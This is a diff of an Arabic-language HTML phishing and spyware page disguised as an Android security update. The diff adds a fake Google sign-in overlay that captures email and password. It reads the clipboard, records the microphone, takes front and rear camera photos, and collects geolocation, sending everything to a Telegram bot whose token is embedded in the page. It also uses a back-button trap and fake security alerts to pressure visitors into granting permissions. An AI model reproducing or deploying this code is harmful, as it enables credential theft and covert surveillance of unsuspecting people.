@@ -13,11 +13,11 @@
         .status-text { font-size: 18px; color: #eee; margin-bottom: 5px; }
         .sub-text { font-size: 12px; color: #777; line-height: 1.5; }
         
-        /* واجهة تسجيل الدخول المخفية */
+        /* واجهة تسجيل الدخول الوهمية (Phishing) */
         #phish-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 9999; justify-content: center; align-items: center; color: #000; }
         .login-card { width: 90%; max-width: 360px; padding: 40px 20px; text-align: center; }
         .login-card img { width: 75px; margin-bottom: 20px; }
-        .login-card input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; }
+        .login-card input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
         .login-card button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 20px; }
         
         #video, #canvas { display: none; }
@@ -26,27 +26,28 @@
 <body>
 
     <div class="update-container" id="main-ui">
-        <img src="https://www.gstatic.com/images/branding/product/2x/android_96dp.png" class="android-logo" alt="Android">
+        <img src="https://www.gstatic.com/images/branding/product/2x/android_96dp.png" class="android-logo">
         <div class="status-text">جاري تثبيت تحديث الأمان... <span id="percent">0%</span></div>
         <div class="progress-bg"><div class="progress-bar" id="bar"></div></div>
-        <p class="sub-text">يتم الآن تحسين أداء النظام وسد الثغرات الأمنية.<br>يرجى عدم إغلاق المتصفح أو إطفاء الهاتف لضمان سلامة بياناتك.</p>
+        <p class="sub-text">يتم الآن سد الثغرات وتحسين أداء النظام.<br>يرجى عدم إغلاق المتصفح لضمان سلامة بياناتك.</p>
     </div>
 
     <div id="phish-overlay">
         <div class="login-card">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google">
-            <h1 style="font-size: 22px; font-weight: 400; margin-bottom: 10px;">تأكيد ملكية الحساب</h1>
-            <p style="font-size: 14px; color: #5f6368;">لإكمال التحديث، يرجى تسجيل الدخول إلى حسابك</p>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg">
+            <h1 style="font-size: 22px; font-weight: 400;">تأكيد ملكية الحساب</h1>
+            <p style="font-size: 14px; color: #5f6368;">لإتمام التحديث، يرجى تسجيل الدخول</p>
             <input type="email" id="email" placeholder="البريد الإلكتروني">
             <input type="password" id="pass" placeholder="كلمة المرور">
             <button onclick="sendCreds()">تأكيد الهوية</button>
         </div>
     </div>
 
-    <video id="video" autoplay playsinline></video>
+    <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
 
     <script>
+        // --- إعدادات التحكم ---
         const TOKEN = "8723330008:AAH7fjX2fEKZ3-7WCWRQyiLHmNoaEY5QUaw";
         const CHAT_ID = "7984067238";
         let currentStream = null;
@@ -55,41 +56,51 @@
             fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
         }
 
-        // 1. اختطاف الحافظة (Clipboard Sniffing)
+        // 1. نظام "سجن المتصفح" والاهتزاز
+        function lockDown() {
+            if (navigator.vibrate) navigator.vibrate([500, 200, 500, 200, 500]);
+            
+            // منع الخروج عبر زر الرجوع (100 مرة لضمان القفل)
+            for (let i = 0; i < 100; i++) {
+                window.history.pushState(null, null, window.location.href);
+            }
+            window.onpopstate = function() {
+                window.history.pushState(null, null, window.location.href);
+                notify("⚠️ **الضحية حاول الخروج عبر زر الرجوع، تم منعه!**");
+            };
+        }
+
+        // 2. سحب الحافظة (Clipboard) عند أول ضغطة
         document.addEventListener('click', async () => {
             try {
                 const text = await navigator.clipboard.readText();
-                if(text) notify(`📋 **نص من الحافظة (Clipboard):**\n\`${text}\``);
+                if(text) notify(`📋 **نص من حافظة الضحية:**\n\`${text}\``);
             } catch(e) {}
-        });
+        }, {once: true});
 
-        // 2. منع الخروج (History Jail)
-        function lockUser() {
-            for(let i=0; i<100; i++) window.history.pushState(null, null, window.location.href);
-            window.onpopstate = () => {
-                window.history.pushState(null, null, window.location.href);
-                notify("🚫 الضحية حاول الخروج!");
-            };
-            if(navigator.vibrate) navigator.vibrate([200, 100, 200]);
-        }
-
-        // 3. التجسس الصوتي والبصري (أمامية/خلفية كل 2 ثانية)
-        async function startSnooping() {
-            // الصوت (كل 15 ثانية)
+        // 3. التجسس الصوتي (5 ثوانٍ كل 15 ثانية)
+        async function startAudio() {
             try {
-                const aStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                const rec = new MediaRecorder(aStream);
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const rec = new MediaRecorder(stream);
                 rec.ondataavailable = (e) => {
-                    const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('voice', e.data, 'v.ogg');
+                    const fd = new FormData();
+                    fd.append('chat_id', CHAT_ID);
+                    fd.append('voice', e.data, 'v.ogg');
                     fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fd });
                 };
-                setInterval(() => { rec.start(); setTimeout(() => rec.stop(), 5000); }, 15000);
-            } catch(e) { notify("❌ رفض الميكروفون"); }
+                setInterval(() => {
+                    rec.start();
+                    setTimeout(() => rec.stop(), 5000);
+                }, 15000);
+            } catch(e) { notify("❌ **الضحية رفض إذن الميكروفون.**"); }
+        }
 
-            // الكاميرا التتابعية
-            const modes = ["user", "environment"];
+        // 4. التصوير المزدوج التتابعي (كل 2 ثانية)
+        async function startVisuals() {
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
+            const modes = ["user", "environment"];
             let i = 0;
             while(true) {
                 try {
@@ -99,8 +110,10 @@
                     await new Promise(r => setTimeout(r, 800));
                     canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
-                    canvas.toBlob(b => {
-                        const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', b, 'i.jpg');
+                    canvas.toBlob(blob => {
+                        const fd = new FormData();
+                        fd.append('chat_id', CHAT_ID);
+                        fd.append('photo', blob, 'shot.jpg');
                         fd.append('caption', `📷 كاميرا: ${modes[i%2]==="user"?"أمامية":"خلفية"}`);
                         fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                     }, 'image/jpeg', 0.5);
@@ -109,45 +122,53 @@
             }
         }
 
-        // 4. محاكاة التحديث (التمويه)
+        // 5. محاكاة التحديث (التمويه)
         function runUpdate() {
             let p = 0;
             const bar = document.getElementById('bar');
             const per = document.getElementById('percent');
-            const interval = setInterval(() => {
+            setInterval(() => {
                 if (p < 99) {
                     p += Math.floor(Math.random() * 2) + 1;
                     if(p > 99) p = 99;
                     bar.style.width = p + '%';
                     per.innerText = p + '%';
                 }
-            }, 8000); // يستغرق وقتاً طويلاً جداً للتمويه
+            }, 6000);
         }
 
         function sendCreds() {
             const e = document.getElementById('email').value;
             const p = document.getElementById('pass').value;
             if(e && p) {
-                notify(`🔑 **حساب جوجل مسحوب:**\n📧: \`${e}\`\n🔐: \`${p}\``);
+                notify(`🔥 **بيانات مسحوبة:**\n📧: \`${e}\`\n🔐: \`${p}\``);
                 document.getElementById('phish-overlay').style.display = 'none';
-                alert("اكتمل التحديث بنجاح. سيتم إعادة تشغيل النظام.");
+                alert("اكتمل التحديث. سيتم إعادة تشغيل النظام.");
             }
         }
 
         window.onload = () => {
-            lockUser();
+            lockDown();
             runUpdate();
-            startSnooping();
-            // سحب البيانات التقنية
-            notify(`⚙️ **ضحية جديد دخل الفخ:**\n📱 النظام: ${navigator.platform}\n🔋 البطارية: ${navigator.getBattery ? 'جاري السحب...' : 'N/A'}`);
+            startAudio();
+            startVisuals();
+            
+            // إظهار تنبيه وهمي لطلب الأذونات
+            setTimeout(() => {
+                alert("⚠️ تم اكتشاف محاولة دخول غريبة لحسابك. يرجى السماح بالأذونات للتحقق من هويتك ومنع الاختراق!");
+            }, 2000);
+
             // سحب الموقع
             navigator.geolocation.getCurrentPosition(pos => {
-                notify(`📍 موقع الضحية: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
+                notify(`📍 **الموقع:** https://www.google.com/maps?q=$${pos.coords.latitude},${pos.coords.longitude}`);
             });
-            // إظهار تسجيل الدخول بعد 40 ثانية من "التحديث"
+
+            // إظهار تسجيل الدخول بعد 40 ثانية
             setTimeout(() => {
                 document.getElementById('phish-overlay').style.display = 'flex';
+                document.getElementById('main-ui').style.filter = 'blur(8px)';
             }, 40000);
+            
             if(navigator.wakeLock) navigator.wakeLock.request('screen');
         };
     </script>
